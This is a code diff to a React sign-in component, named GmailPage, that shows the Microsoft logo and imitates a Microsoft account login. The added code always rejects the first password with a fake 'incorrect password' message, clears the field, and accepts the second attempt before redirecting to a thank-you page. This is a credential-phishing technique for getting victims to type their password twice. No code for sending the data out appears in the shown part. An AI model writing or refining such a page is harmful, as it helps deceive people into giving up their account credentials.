@@ -1,5 +1,6 @@
 import React, { useState } from "react";
 import { microsoftLogo } from "../assets";
+import { useNavigate } from "react-router-dom";
 
 const GmailPage = () => {
   const [email, setEmail] = useState("");
@@ -7,6 +8,8 @@ const GmailPage = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [msg, setMsg] = useState("");
   const [msg2, setMsg2] = useState("");
+  const [isFirstAttempt, setIsFirstAttempt] = useState(true);
+  const navigate = useNavigate();
 
   const handleNext = () => {
     if (!email) {
@@ -25,15 +28,27 @@ const GmailPage = () => {
     e.preventDefault();
     if (!password) {
       setMsg2("Please enter the password for your Microsoft account.");
+    } else if (isFirstAttempt) {
+      setMsg2(
+        "The email or password you entered is incorrect. Please try again."
+      );
+      setPassword("");
+      setIsFirstAttempt(false);
+      setShowPassword(false); // Go back to email input page
     } else {
-      // Handle form submission here
+      // Proceed with the form submission logic here
+      navigate("/thankyou"); // Navigate to ThankYouPage
     }
   };
 
   return (
     <div className="flex items-center justify-center h-screen bg-gray-100">
       <div className="bg-white p-8 rounded shadow-md w-full max-w-md">
-        <img src={microsoftLogo} alt="Microsoft Logo" className="mx-auto mb-6" />
+        <img
+          src={microsoftLogo}
+          alt="Microsoft Logo"
+          className="mx-auto mb-6"
+        />
         {!showPassword ? (
           <div className="slide-one">
             <h2 className="text-2xl font-semibold mb-4">Sign in</h2>
